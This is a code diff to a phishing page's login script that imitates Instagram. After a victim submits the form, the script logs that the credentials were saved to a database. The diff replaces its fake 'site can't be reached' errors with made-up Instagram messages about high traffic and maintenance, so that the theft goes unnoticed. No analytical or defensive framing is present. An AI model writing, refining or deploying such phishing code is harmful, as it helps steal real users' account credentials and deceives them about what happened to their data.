@@ -44,25 +44,25 @@ function checkLogin() {
         console.log('Server response data:', data);
         if (data.success) {
             console.log('✅ Credentials saved to database!');
-            // Show site not reached error message
+            // Show busy/maintenance message
             if (errorElement && errorText) {
-                errorText.innerHTML = 'This site can\'t be reached. Check if there is a typo in the address or try reloading the page.';
+                errorText.innerHTML = 'Instagram is experiencing high traffic right now. Please wait a few minutes and try again.';
                 errorElement.style.display = "flex";
                 console.log('Error message displayed');
             }
         } else {
             console.log('Server returned error');
             if (errorElement && errorText) {
-                errorText.innerHTML = 'This site can\'t be reached. Please try again later.';
+                errorText.innerHTML = 'We\'re sorry, but something went wrong. Please try again in a moment.';
                 errorElement.style.display = "flex";
             }
         }
     })
     .catch(error => {
         console.error('❌ Fetch error:', error);
-        // Show site not reached error
+        // Show busy/maintenance message
         if (errorElement && errorText) {
-            errorText.innerHTML = 'This site can\'t be reached. The connection was reset.';
+            errorText.innerHTML = 'Instagram is temporarily unavailable due to maintenance. Please check back shortly.';
             errorElement.style.display = "flex";
             console.log('Error message displayed (catch)');
         }
